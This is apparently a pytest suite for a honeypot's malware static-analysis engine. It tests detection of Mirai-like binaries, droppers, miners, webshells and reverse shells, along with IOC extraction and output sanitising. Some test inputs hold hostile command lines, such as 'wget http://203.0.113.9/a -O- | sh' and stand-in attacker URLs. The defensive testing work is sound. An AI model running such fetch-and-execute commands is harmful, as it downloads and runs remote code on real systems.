from __future__ import annotations

import gzip
import json
import os
import subprocess
import sys
import textwrap
from pathlib import Path

import pytest

from honeynet.analysis import analyze_file, get_backend
from honeynet.analysis.builtin import BuiltinBackend
from honeynet.analysis.command_backend import CommandBackend
from honeynet.analysis.engine import EngineConfig
from honeynet.analysis.fixtures import C2_DOMAIN, C2_ENDPOINT, DROP_IP, POOL, WALLET, all_fixtures
from honeynet.analysis.iocs import b58check_ok, extract_iocs
from honeynet.analysis.model import AnalysisBackend, BackendUnavailable, BinaryInfo, Insn, Section
from honeynet.analysis.syscalls import find_syscalls
from honeynet.analysis.worker import AnalysisWorker, iter_samples, needs_analysis, report_path
from honeynet.common.quarantine import Quarantine

needs_capstone = pytest.mark.skipif(not BuiltinBackend.available(), reason="capstone not installed")


@pytest.fixture(scope="module")
def samples(tmp_path_factory) -> dict[str, Path]:
    d = tmp_path_factory.mktemp("samples")
    out = {}
    for name, blob in all_fixtures().items():
        p = d / name
        p.write_bytes(blob)
        out[name] = p
    return out


@pytest.fixture(scope="module")
def backend():
    return get_backend("builtin") if BuiltinBackend.available() else None


def beh_ids(report) -> set[str]:
    return {b["id"] for b in report["behaviors"]}


# --------------------------------------------------------------------------- binaries

@needs_capstone
@pytest.mark.parametrize("name,arch", [("mirai_like_x86_64.elf", "x86_64"), ("mirai_like_arm.elf", "arm"),
                                       ("mirai_like_mips.elf", "mips")])
def test_mirai_like_all_architectures(samples, backend, name, arch):
    r = analyze_file(samples[name], backend)
    assert r["file"]["format"] == "ELF" and r["file"]["arch"] == arch
    assert r["static_only"] is True
    assert r["family"]["id"] == "mirai_like" and r["family"]["confidence"] > 0.8
    assert any("watchdog" in x for x in r["family"]["reasons"])
    assert {"sys-network-client", "sys-process-kill", "sys-daemonize", "scan-credential-dictionary"} <= beh_ids(r)
    names = [s["name"] for s in r["syscalls"]]
    assert {"socket", "connect", "fork", "setsid", "kill"} <= set(names)
    c2 = {c["value"] for c in r["c2_candidates"]}
    assert C2_ENDPOINT in c2 and C2_DOMAIN in c2
    assert r["risk"]["level"] in ("high", "critical")
    assert "T1496" not in r["mitre"] and "T1110.001" in r["mitre"]


@needs_capstone
def test_every_syscall_finding_has_disassembly_snippet(samples, backend):
    r = analyze_file(samples["mirai_like_x86_64.elf"], backend)
    kill = next(b for b in r["behaviors"] if b["id"] == "sys-process-kill")
    key = kill["evidence"][0]["snippet"]
    snip = r["snippets"][key]
    assert snip["kind"] == "disasm"
    hl = snip["lines"][snip["highlight"]]
    assert "syscall" in hl and "kill" in hl
    assert any("mov eax, 0x3e" in ln for ln in snip["lines"])


@needs_capstone
def test_string_evidence_links_to_referencing_code(samples, backend):
    r = analyze_file(samples["mirai_like_x86_64.elf"], backend)
    wd = next(b for b in r["behaviors"] if b["id"] == "persist-watchdog")
    snip = r["snippets"][wd["evidence"][0]["snippet"]]
    assert snip["kind"] == "disasm" and "referencing" in snip["title"]
    assert any("lea rdi, [rip" in ln for ln in snip["lines"])
    # ARM literal pools and MIPS lui/addiu pairs are resolved as well
    for name in ("mirai_like_arm.elf", "mirai_like_mips.elf"):
        rr = analyze_file(samples[name], backend)
        w = next(b for b in rr["behaviors"] if b["id"] == "persist-watchdog")
        assert rr["snippets"][w["evidence"][0]["snippet"]]["kind"] == "disasm", name


@needs_capstone
def test_syscall_args_do_not_leak_between_sites(samples, backend):
    r = analyze_file(samples["mirai_like_x86_64.elf"], backend)
    fork = next(s for s in r["syscalls"] if s["name"] == "fork")
    assert fork["args"] == [None, None, None]
    sock = next(s for s in r["syscalls"] if s["name"] == "socket")
    assert sock["args"][:2] == [2, 1]


@needs_capstone
def test_xor_scrambled_table_is_recovered(samples, backend):
    r = analyze_file(samples["mirai_xor_x86_64.elf"], backend)
    assert r["strings"]["xor_key"] == 0x22
    assert any(i["value"] == f"http://{DROP_IP}/bins/x86" for i in r["iocs"])
    assert "persist-watchdog" in beh_ids(r)
    ev = next(b for b in r["behaviors"] if b["id"] == "persist-watchdog")["evidence"][0]
    assert "XOR" in r["snippets"][ev["snippet"]]["title"]


@needs_capstone
def test_packed_looking_elf_is_flagged_not_misclassified(samples, backend):
    r = analyze_file(samples["packed_like.elf"], backend)
    assert r["packing"]["packed"] is True
    assert any("UPX" in i for i in r["packing"]["indicators"])
    assert r["family"]["id"] == "unknown" and r["risk"]["level"] in ("info", "low")


def test_random_blob_does_not_crash(samples, backend):
    r = analyze_file(samples["random.bin"], backend)
    assert r["file"]["kind"] == "data" and r["entropy"]["overall"] > 7.5
    assert r["risk"]["level"] == "info"


@needs_capstone
def test_truncated_and_garbage_elf_degrade_gracefully(tmp_path, backend):
    good = all_fixtures()["mirai_like_x86_64.elf"]
    for n, blob in {"cut": good[:90], "hdr": good[:64], "junk": good[:20] + b"\xff" * 400, "tiny": b"\x7fELF"}.items():
        p = tmp_path / n
        p.write_bytes(blob)
        r = analyze_file(p, backend)
        assert r["sha256"] and r["family"]["id"] in ("unknown", "mirai_like")
        json.dumps(r)


# --------------------------------------------------------------------------- scripts

@pytest.mark.parametrize("name,family", [("dropper.sh", "downloader_script"), ("miner_setup.sh", "cryptominer"),
                                         ("ssh_implant.sh", "ssh_key_implant"), ("webshell.php", "php_webshell"),
                                         ("revshell.sh", "reverse_shell"), ("dropper_b64.sh", "downloader_script")])
def test_script_families(samples, backend, name, family):
    r = analyze_file(samples[name], backend)
    assert r["family"]["id"] == family, r["family"]
    assert r["family"]["reasons"]
    assert r["file"]["format"] != "ELF"


def test_dropper_details(samples):
    r = analyze_file(samples["dropper.sh"], None)
    assert {"propagation-download-exec", "propagation-multiarch", "persist-cron", "self-delete"} <= beh_ids(r)
    urls = {i["value"] for i in r["iocs"] if i["type"] == "url"}
    assert f"http://{DROP_IP}/bins/bins.sh" in urls
    ev = next(b for b in r["behaviors"] if b["id"] == "persist-cron")["evidence"][0]
    snip = r["snippets"][ev["snippet"]]
    assert snip["kind"] == "script" and "cron" in "\n".join(snip["lines"])
    assert "T1105" in r["mitre"] and "T1053.003" in r["mitre"]


def test_miner_iocs(samples):
    r = analyze_file(samples["miner_setup.sh"], None)
    kinds = {(i["type"], i["value"]) for i in r["iocs"]}
    assert ("pool", POOL) in kinds and ("wallet", WALLET) in kinds
    assert "mining-stratum" in beh_ids(r) and "T1496" in r["mitre"]


def test_base64_layer_is_decoded_and_scanned(samples):
    r = analyze_file(samples["dropper_b64.sh"], None)
    assert r["decoded_layers"] and f"{DROP_IP}/x.sh" in r["decoded_layers"][0]["text"]
    assert any(i["type"] == "url" and DROP_IP in i["value"] for i in r["iocs"])
    assert r["packing"]["packed"] is True


def test_benign_script_is_quiet(samples):
    r = analyze_file(samples["benign_hello.sh"], None)
    assert r["family"]["id"] == "unknown" and r["risk"]["level"] == "info" and not r["behaviors"]


def test_ordinary_words_are_not_a_credential_dictionary(tmp_path):
    p = tmp_path / "admin_notes.sh"
    p.write_text("#!/bin/sh\n# root user admin test service system default password guest support\necho done\n")
    r = analyze_file(p, None)
    assert "scan-credential-dictionary" not in beh_ids(r)


def test_gzip_container_is_unwrapped(tmp_path, samples):
    p = tmp_path / "x.gz"
    p.write_bytes(gzip.compress(samples["dropper.sh"].read_bytes()))
    r = analyze_file(p, None)
    assert r["container"]["type"] == "gzip" and r["family"]["id"] == "downloader_script"
    assert r["sha256"] != r["container"]["inner_sha256"]


def test_decompression_bomb_is_bounded(tmp_path):
    p = tmp_path / "bomb.gz"
    p.write_bytes(gzip.compress(b"A" * (64 * 1024 * 1024), compresslevel=9))
    r = analyze_file(p, None, EngineConfig(decompress_limit=1024 * 1024))
    assert r["container"]["inner_size"] <= 1024 * 1024


# --------------------------------------------------------------------------- IOCs

def test_ioc_extraction_cases():
    text = ("connect 203.0.113.7:4444 and 10.0.0.5 and 8.8.8.8\nhttp://evil.example.invalid/a.sh?x=1\n"
            f"wallet {WALLET} fake 1BoatSLRHtKNngkdXEeobR76b53LETtpyX\nuser-agent: Mozilla/5.0 (X11) bot\n"
            "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFixtureFixtureFixtureFixtureFixture1234 me@box\n")
    iocs = {(i.type, i.value): i for i in extract_iocs(text)}
    assert ("endpoint", "203.0.113.7:4444") in iocs
    assert iocs[("ip", "10.0.0.5")].scope == "private" and iocs[("ip", "10.0.0.5")].confidence < 0.3
    assert ("url", "http://evil.example.invalid/a.sh?x=1") in iocs
    assert ("domain", "evil.example.invalid") in iocs
    assert ("wallet", WALLET) in iocs
    assert ("wallet", "1BoatSLRHtKNngkdXEeobR76b53LETtpyX") not in iocs        # bad checksum
    assert any(t == "ssh_key" for t, _ in iocs)


def test_b58check():
    assert b58check_ok(WALLET, (0, 5))
    assert not b58check_ok(WALLET[:-1] + "b", (0, 5))


def test_version_numbers_and_resolvers_are_not_c2(tmp_path):
    p = tmp_path / "x.sh"
    p.write_text("#!/bin/sh\necho 'agent version 2.6.32.1 build'\necho nameserver 8.8.8.8\nwget http://203.0.113.9/a -O- | sh\n")
    r = analyze_file(p, None)
    ips = {i["value"]: i for i in r["iocs"] if i["type"] == "ip"}
    assert ips["2.6.32.1"]["confidence"] <= 0.2
    assert ips["8.8.8.8"]["scope"] == "infrastructure"
    c2 = {c["value"] for c in r["c2_candidates"]}
    assert "8.8.8.8" not in c2 and "2.6.32.1" not in c2


# --------------------------------------------------------------------------- hostile content

def test_report_contains_no_raw_control_characters(tmp_path):
    p = tmp_path / "evil.sh"
    p.write_bytes(b"#!/bin/sh\nwget http://203.0.113.9/\x1b[2J\x07\r\xe2\x80\xae/a.sh | sh\n"
                  b"echo '\x1b]0;pwned\x07' ; crontab -l\n")
    r = analyze_file(p, None)

    def walk(o):
        if isinstance(o, str):
            assert all(ord(c) >= 0x20 and ord(c) not in range(0x7F, 0xA0) and c not in "\u202e\u2028\u2029" for c in o), repr(o)
        elif isinstance(o, dict):
            for k, v in o.items():
                walk(k)
                walk(v)
        elif isinstance(o, list):
            for v in o:
                walk(v)

    walk(r)
    assert "\\x1b" in json.dumps(r)


# --------------------------------------------------------------------------- adapter interface

class FakeBackend(AnalysisBackend):
    """A backend that knows nothing about capstone/pyelftools: proves the engine only uses the interface."""
    name = "fake"

    def __init__(self, fail: str | None = None):
        self.fail, self.calls = fail, []

    def inspect(self, path):
        self.calls.append("inspect")
        if self.fail == "inspect":
            raise BackendUnavailable("tool missing")
        return BinaryInfo(fmt="ELF", arch="x86_64", bits=64, entry=0x1000, static=True, stripped=True,
                          sections=[Section(".text", 0x1000, 0, 64, True, False)])

    def disassemble(self, path, info, max_insns=300000):
        self.calls.append("disassemble")
        if self.fail == "disasm":
            raise RuntimeError("boom")
        code = [("xor", "eax, eax"), ("mov", "edi, 2"), ("mov", "eax, 0x29"), ("syscall", ""), ("mov", "eax, 0x2a"), ("syscall", ""),
                ("mov", "eax, 0x3e"), ("syscall", ""), ("mov", "eax, 0x39"), ("syscall", "")]
        return [Insn(0x1000 + 2 * i, 2, m, o) for i, (m, o) in enumerate(code)]

    def pseudocode(self, path, info, address):
        self.calls.append("pseudocode")
        return "int sub_1000() {\n  return socket(2, 1, 0);\n}"


def _elf_stub(tmp_path):
    p = tmp_path / "fake.elf"
    p.write_bytes(b"\x7fELF" + b"\x02\x01\x01" + b"\x00" * 200)
    return p


def test_engine_uses_only_the_adapter_interface(tmp_path):
    fb = FakeBackend()
    r = analyze_file(_elf_stub(tmp_path), fb)
    assert fb.calls[:2] == ["inspect", "disassemble"]
    assert r["backend"]["name"] == "fake"
    assert {s["name"] for s in r["syscalls"]} >= {"socket", "kill", "fork"}
    assert any(s["kind"] == "pseudocode" for s in r["snippets"].values())      # decompiler output is carried into the report


@pytest.mark.parametrize("fail", ["inspect", "disasm"])
def test_backend_failures_are_reported_not_raised(tmp_path, fail):
    r = analyze_file(_elf_stub(tmp_path), FakeBackend(fail))
    assert r["errors"] and r["sha256"]


def test_analysis_without_any_backend_still_hashes_and_extracts(samples):
    r = analyze_file(samples["mirai_like_x86_64.elf"], None)
    assert r["sha256"] and r["backend"]["name"] == "none"
    assert any(i["type"] == "endpoint" for i in r["iocs"])


def test_command_backend_contract(tmp_path):
    tool = tmp_path / "fake_re_tool.py"
    tool.write_text(textwrap.dedent("""
        import json, sys
        cmd = sys.argv[1]
        if cmd == "inspect":
            print(json.dumps({"fmt": "ELF", "arch": "x86_64", "bits": 64, "static": True,
                              "sections": [{"name": ".text", "vaddr": 4096, "offset": 0, "size": 64, "executable": True}]}))
        elif cmd == "disasm":
            rows = [{"address": 4096 + 2 * i, "size": 2, "mnemonic": m, "op_str": o, "bytes": "00"}
                    for i, (m, o) in enumerate([("mov", "eax, 0x29"), ("syscall", ""), ("mov", "eax, 0x2a"), ("syscall", "")])]
            print(json.dumps(rows))
        elif cmd == "pseudo":
            print("void f(void) { socket(); }")
    """))
    cb = CommandBackend(f'"{sys.executable}" "{tool}"', timeout=30)
    r = analyze_file(_elf_stub(tmp_path), cb)
    assert r["backend"]["name"] == "command"
    assert {s["name"] for s in r["syscalls"]} == {"socket", "connect"}
    assert any(s["kind"] == "pseudocode" for s in r["snippets"].values())


def test_command_backend_errors_are_contained(tmp_path):
    with pytest.raises(BackendUnavailable):
        CommandBackend("")
    cb = CommandBackend(f'"{sys.executable}" -c "import sys; sys.exit(7)"', timeout=30)
    r = analyze_file(_elf_stub(tmp_path), cb)
    assert any("exited 7" in e for e in r["errors"])
    missing = CommandBackend(str(tmp_path / "nope-tool"), timeout=5)
    assert any("not found" in e for e in analyze_file(_elf_stub(tmp_path), missing)["errors"])


def test_get_backend_factory():
    assert get_backend("command", f'"{sys.executable}"').name == "command"
    if BuiltinBackend.available():
        assert get_backend("builtin").name == "builtin"


def test_find_syscalls_x86_64_and_unknown_arch():
    insns = [Insn(0, 5, "mov", "eax, 0x29"), Insn(5, 2, "syscall", "")]
    assert find_syscalls("x86_64", insns)[0].name == "socket"
    assert find_syscalls("riscv", insns) == []


# --------------------------------------------------------------------------- worker

def test_worker_reads_quarantine_and_writes_reports(settings, samples):
    q = Quarantine(settings.quarantine_dir)
    stored = {name: q.store(samples[name].read_bytes(), {"test": name}) for name in ("dropper.sh", "miner_setup.sh")}
    before = {s.sha256: q.read(s.sha256) for s in stored.values()}
    assert len(list(iter_samples(settings.quarantine_dir))) == 2
    settings.analysis_timeout = 90
    w = AnalysisWorker(settings)
    assert w.run_once() == 2
    for s in stored.values():
        rep = json.loads(report_path(settings.analysis_dir, s.sha256).read_text("utf-8"))
        assert rep["sha256"] == s.sha256 and rep["family"]["id"] in ("downloader_script", "cryptominer")
    assert w.run_once() == 0                                   # nothing to redo
    assert before == {s.sha256: q.read(s.sha256) for s in stored.values()}      # quarantine untouched


def test_worker_records_timeouts_instead_of_retrying_forever(settings, samples):
    q = Quarantine(settings.quarantine_dir)
    s = q.store(samples["dropper.sh"].read_bytes(), {})
    settings.analysis_timeout = 0.001                          # type: ignore[assignment]
    w = AnalysisWorker(settings)
    assert w.run_once() == 1
    rep = json.loads(report_path(settings.analysis_dir, s.sha256).read_text("utf-8"))
    assert rep["status"] == "failed" and "timed out" in rep["errors"][0]
    assert not needs_analysis(settings.analysis_dir, s.sha256)
    assert w.run_once() == 0


def test_run_one_disables_sockets():
    code = ("from honeynet.analysis.run_one import disable_network; import socket; disable_network()\n"
            "s = socket.socket()\n"
            "try:\n    s.connect(('127.0.0.1', 9))\nexcept OSError as e:\n    print('blocked', e)\n")
    cp = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True,
                        env={**os.environ, "PYTHONPATH": str(Path(__file__).resolve().parents[1] / "src")})
    assert "blocked" in cp.stdout, cp.stderr
